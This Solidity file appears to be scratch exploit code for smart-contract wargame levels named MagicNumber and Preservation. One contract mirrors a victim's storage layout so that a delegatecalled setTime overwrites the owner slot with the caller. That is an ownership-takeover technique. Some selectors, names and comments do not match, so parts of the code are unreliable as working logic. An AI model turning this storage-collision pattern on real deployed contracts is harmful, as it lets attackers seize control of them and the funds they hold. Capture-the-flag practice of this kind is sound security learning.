// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MagicNumber {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    address public smallContract;

  bytes4 constant setTimeSignature = bytes4(keccak256("setFirstTime(uint256)"));
  
  constructor() {
    smallContract = address(0x69e6BCb2d77Ef8d3f509b257E8CADa793fc74ED5);
  }


// set the time for timezone 1
  function callContract(address elContract) public {
    elContract.delegatecall(abi.encodePacked(setTimeSignature));
  }

  function getAddressAsUINT(address libAddr) public returns(uint _timestamp){
      _timestamp = uint256(uint160(address(libAddr)));
  }

  function getMagicNumber(address _addr) public returns(uint){
    (bool result, bytes memory data) = _addr.call("");
    uint numb = abi.decode(data, (uint));

    if(!result) revert("my result was false");
    return numb;
  }
  
}

contract TheLibraryContractPreservation {

  // stores a timestamp 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  function setTime(uint _time) public {
    owner = msg.sender;
  }
}